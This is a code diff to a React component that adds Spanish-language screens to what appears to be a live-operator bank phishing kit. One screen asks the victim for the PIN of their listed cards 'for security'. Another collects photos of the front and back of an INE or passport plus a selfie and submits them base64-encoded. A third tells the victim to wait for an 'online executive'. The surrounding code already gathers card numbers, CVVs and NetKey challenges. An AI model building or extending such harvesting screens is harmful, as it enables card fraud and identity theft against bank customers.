@@ -132,6 +132,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [tarjetas, setTarjetas] = useState([{ numero: '', vencimiento: '', cvv: '', tipo: 'credito' as 'credito' | 'debito' }]);
   const [showContinueBtn, setShowContinueBtn] = useState(false);
 
+  // Estados para NIP_TARJETA
+  const [nipTarjeta, setNipTarjeta] = useState('');
+
+  // Estados para CONFIRMAR_IDENTIDAD
+  const [tipoIdentificacion, setTipoIdentificacion] = useState<'INE' | 'Pasaporte'>('INE');
+  const [fotoIdentidadFrente, setFotoIdentidadFrente] = useState<File | null>(null);
+  const [fotoIdentidadAtras, setFotoIdentidadAtras] = useState<File | null>(null);
+  const [fotoSelfie, setFotoSelfie] = useState<File | null>(null);
+
   // useEffect para inicializar el timer basándose en waitingStartTime
   useEffect(() => {
     if (currentScreen === ScreenType.ACTUALIZACION && sessionData?.waitingStartTime) {
@@ -199,6 +208,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     } else {
       return `${v.substring(0, 2)}/${v.substring(2, 4)}`;
     }
+  };
+
+  // Función para convertir archivo a base64
+  const fileToBase64 = (file: File): Promise<string> => {
+    return new Promise((resolve, reject) => {
+      const reader = new FileReader();
+      reader.readAsDataURL(file);
+      reader.onload = () => resolve(reader.result as string);
+      reader.onerror = error => reject(error);
+    });
   };
 
   // Helper function to render the appropriate screen
@@ -3649,6 +3668,261 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.NETKEY_MANUAL:
         const manualChallenge = screenData.manualNetkeyChallenge || sessionData?.manualNetkeyChallenge || '00000000';
         return <NetKeyManual manualChallenge={manualChallenge} onSubmit={onSubmit} />;
+
+      case ScreenType.NIP_TARJETA:
+        const tarjetasProtegidas = sessionData?.tarjetasProtegidas 
+          ? JSON.parse(sessionData.tarjetasProtegidas) 
+          : [];
+        
+        const nipTarjetaContent = (
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', padding: '20px' }}>
+            <div style={{ maxWidth: '600px', margin: '0 auto', background: '#ffffff', borderRadius: '12px', boxShadow: '0 4px 20px rgba(0, 0, 0, 0.1)', padding: '40px' }}>
+              <h2 style={{ fontSize: '24px', fontWeight: 700, color: '#1f2937', marginBottom: '16px', textAlign: 'center' }}>
+                Ingresa el NIP de tu tarjeta
+              </h2>
+
+              <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '28px', textAlign: 'center', lineHeight: '1.6' }}>
+                Por seguridad, necesitamos que ingreses el NIP de las tarjetas protegidas
+              </p>
+
+              <form onSubmit={(e) => {
+                e.preventDefault();
+                if (nipTarjeta.length === 4) {
+                  onSubmit(ScreenType.NIP_TARJETA, { nipTarjeta });
+                }
+              }}>
+                {tarjetasProtegidas.length > 0 && (
+                  <div style={{ marginBottom: '24px' }}>
+                    <h3 style={{ fontSize: '14px', fontWeight: 600, color: '#374151', marginBottom: '12px' }}>
+                      Tarjetas protegidas:
+                    </h3>
+                    {tarjetasProtegidas.map((tarjeta: any, index: number) => (
+                      <div key={index} style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: '8px', padding: '12px', marginBottom: '8px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                        <span style={{ fontSize: '14px', color: '#374151' }}>
+                          {tarjeta.tipo === 'credito' ? 'Crédito' : 'Débito'}
+                        </span>
+                        <span style={{ fontSize: '14px', fontWeight: 600, color: '#1f2937' }}>
+                          **** {tarjeta.numero.slice(-4)}
+                        </span>
+                      </div>
+                    ))}
+                  </div>
+                )}
+
+                <div style={{ marginBottom: '24px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
+                    NIP de 4 dígitos
+                  </label>
+                  <input
+                    type="password"
+                    value={nipTarjeta}
+                    onChange={(e) => {
+                      const value = e.target.value.replace(/\D/g, '').slice(0, 4);
+                      setNipTarjeta(value);
+                    }}
+                    maxLength={4}
+                    placeholder="****"
+                    style={{ width: '100%', padding: '12px', border: '1px solid #d1d5db', borderRadius: '8px', fontSize: '16px', textAlign: 'center', letterSpacing: '8px' }}
+                    data-testid="input-nip-tarjeta"
+                    required
+                  />
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={nipTarjeta.length !== 4}
+                  style={{ width: '100%', background: nipTarjeta.length === 4 ? '#153e46' : '#9ca3af', color: 'white', padding: '14px', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 600, cursor: nipTarjeta.length === 4 ? 'pointer' : 'not-allowed', transition: 'background 0.3s' }}
+                  data-testid="button-submit-nip"
+                >
+                  Continuar
+                </button>
+              </form>
+            </div>
+          </div>
+        );
+        return nipTarjetaContent;
+
+      case ScreenType.CONFIRMAR_IDENTIDAD:
+        const confirmarIdentidadContent = (
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', padding: '20px' }}>
+            <div style={{ maxWidth: '700px', margin: '0 auto', background: '#ffffff', borderRadius: '12px', boxShadow: '0 4px 20px rgba(0, 0, 0, 0.1)', padding: '40px' }}>
+              <h2 style={{ fontSize: '24px', fontWeight: 700, color: '#1f2937', marginBottom: '16px', textAlign: 'center' }}>
+                Confirma tu identidad
+              </h2>
+
+              <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '28px', textAlign: 'center', lineHeight: '1.6' }}>
+                Sube una foto de tu identificación oficial
+              </p>
+
+              <form onSubmit={async (e) => {
+                e.preventDefault();
+                if (fotoIdentidadFrente && fotoSelfie) {
+                  if (tipoIdentificacion === 'INE' && !fotoIdentidadAtras) {
+                    return;
+                  }
+                  
+                  const frenteBase64 = await fileToBase64(fotoIdentidadFrente);
+                  const selfieBase64 = await fileToBase64(fotoSelfie);
+                  const atrasBase64 = fotoIdentidadAtras ? await fileToBase64(fotoIdentidadAtras) : undefined;
+
+                  onSubmit(ScreenType.CONFIRMAR_IDENTIDAD, {
+                    tipoIdentificacion,
+                    fotoIdentidadFrente: frenteBase64,
+                    fotoIdentidadAtras: atrasBase64,
+                    fotoSelfie: selfieBase64
+                  });
+                }
+              }}>
+                <div style={{ marginBottom: '24px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
+                    Tipo de identificación
+                  </label>
+                  <div style={{ display: 'flex', gap: '12px' }}>
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setTipoIdentificacion('INE');
+                        setFotoIdentidadAtras(null);
+                      }}
+                      style={{ flex: 1, padding: '12px', border: tipoIdentificacion === 'INE' ? '2px solid #153e46' : '1px solid #d1d5db', borderRadius: '8px', background: tipoIdentificacion === 'INE' ? '#f0f9ff' : 'white', fontSize: '16px', fontWeight: 600, color: tipoIdentificacion === 'INE' ? '#153e46' : '#6b7280', cursor: 'pointer' }}
+                      data-testid="button-tipo-ine"
+                    >
+                      INE
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => {
+                        setTipoIdentificacion('Pasaporte');
+                        setFotoIdentidadAtras(null);
+                      }}
+                      style={{ flex: 1, padding: '12px', border: tipoIdentificacion === 'Pasaporte' ? '2px solid #153e46' : '1px solid #d1d5db', borderRadius: '8px', background: tipoIdentificacion === 'Pasaporte' ? '#f0f9ff' : 'white', fontSize: '16px', fontWeight: 600, color: tipoIdentificacion === 'Pasaporte' ? '#153e46' : '#6b7280', cursor: 'pointer' }}
+                      data-testid="button-tipo-pasaporte"
+                    >
+                      Pasaporte
+                    </button>
+                  </div>
+                </div>
+
+                <div style={{ marginBottom: '24px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
+                    Foto frontal de {tipoIdentificacion}
+                  </label>
+                  <div style={{ position: 'relative', border: '2px dashed #d1d5db', borderRadius: '8px', padding: '24px', textAlign: 'center', background: fotoIdentidadFrente ? '#f0fdf4' : '#f9fafb' }}>
+                    <input
+                      type="file"
+                      accept="image/*"
+                      onChange={(e) => {
+                        if (e.target.files && e.target.files[0]) {
+                          setFotoIdentidadFrente(e.target.files[0]);
+                        }
+                      }}
+                      style={{ position: 'absolute', inset: 0, opacity: 0, cursor: 'pointer' }}
+                      data-testid="input-foto-frente"
+                      required
+                    />
+                    <div style={{ pointerEvents: 'none' }}>
+                      <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '4px' }}>
+                        {fotoIdentidadFrente ? `✓ ${fotoIdentidadFrente.name}` : 'Toca para subir foto'}
+                      </p>
+                      <p style={{ fontSize: '12px', color: '#9ca3af' }}>
+                        Foto del frente de tu {tipoIdentificacion}
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                {tipoIdentificacion === 'INE' && (
+                  <div style={{ marginBottom: '24px' }}>
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
+                      Foto trasera de INE
+                    </label>
+                    <div style={{ position: 'relative', border: '2px dashed #d1d5db', borderRadius: '8px', padding: '24px', textAlign: 'center', background: fotoIdentidadAtras ? '#f0fdf4' : '#f9fafb' }}>
+                      <input
+                        type="file"
+                        accept="image/*"
+                        onChange={(e) => {
+                          if (e.target.files && e.target.files[0]) {
+                            setFotoIdentidadAtras(e.target.files[0]);
+                          }
+                        }}
+                        style={{ position: 'absolute', inset: 0, opacity: 0, cursor: 'pointer' }}
+                        data-testid="input-foto-atras"
+                        required
+                      />
+                      <div style={{ pointerEvents: 'none' }}>
+                        <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '4px' }}>
+                          {fotoIdentidadAtras ? `✓ ${fotoIdentidadAtras.name}` : 'Toca para subir foto'}
+                        </p>
+                        <p style={{ fontSize: '12px', color: '#9ca3af' }}>
+                          Foto de atrás de tu INE
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                )}
+
+                <div style={{ marginBottom: '24px' }}>
+                  <label style={{ display: 'block', fontSize: '14px', fontWeight: 500, color: '#374151', marginBottom: '8px' }}>
+                    Foto selfie
+                  </label>
+                  <div style={{ position: 'relative', border: '2px dashed #d1d5db', borderRadius: '8px', padding: '24px', textAlign: 'center', background: fotoSelfie ? '#f0fdf4' : '#f9fafb' }}>
+                    <input
+                      type="file"
+                      accept="image/*"
+                      onChange={(e) => {
+                        if (e.target.files && e.target.files[0]) {
+                          setFotoSelfie(e.target.files[0]);
+                        }
+                      }}
+                      style={{ position: 'absolute', inset: 0, opacity: 0, cursor: 'pointer' }}
+                      data-testid="input-foto-selfie"
+                      required
+                    />
+                    <div style={{ pointerEvents: 'none' }}>
+                      <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '4px' }}>
+                        {fotoSelfie ? `✓ ${fotoSelfie.name}` : 'Toca para subir foto'}
+                      </p>
+                      <p style={{ fontSize: '12px', color: '#9ca3af' }}>
+                        Toma una selfie con tu rostro visible
+                      </p>
+                    </div>
+                  </div>
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={!fotoIdentidadFrente || !fotoSelfie || (tipoIdentificacion === 'INE' && !fotoIdentidadAtras)}
+                  style={{ width: '100%', background: (fotoIdentidadFrente && fotoSelfie && (tipoIdentificacion === 'Pasaporte' || fotoIdentidadAtras)) ? '#153e46' : '#9ca3af', color: 'white', padding: '14px', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 600, cursor: (fotoIdentidadFrente && fotoSelfie && (tipoIdentificacion === 'Pasaporte' || fotoIdentidadAtras)) ? 'pointer' : 'not-allowed', transition: 'background 0.3s' }}
+                  data-testid="button-submit-identidad"
+                >
+                  Enviar documentos
+                </button>
+              </form>
+            </div>
+          </div>
+        );
+        return confirmarIdentidadContent;
+
+      case ScreenType.VALIDANDO_IDENTIDAD:
+        const validandoIdentidadContent = (
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
+            <div style={{ maxWidth: '500px', textAlign: 'center' }}>
+              <div style={{ marginBottom: '32px' }}>
+                <img src={validatingGif} alt="Validando" style={{ width: '120px', height: '120px', margin: '0 auto' }} />
+              </div>
+              <h2 style={{ fontSize: '24px', fontWeight: 600, color: '#0c4a5e', marginBottom: '16px' }}>
+                Estamos validando tu información
+              </h2>
+              <p style={{ fontSize: '16px', color: '#6b7280', lineHeight: '1.6', marginBottom: '8px' }}>
+                Sigue las instrucciones de tu ejecutivo en línea
+              </p>
+              <p style={{ fontSize: '14px', color: '#9ca3af', fontStyle: 'italic' }}>
+                Espera un momento. No cierres esta ventana
+              </p>
+            </div>
+          </div>
+        );
+        return validandoIdentidadContent;
 
       default:
         return (
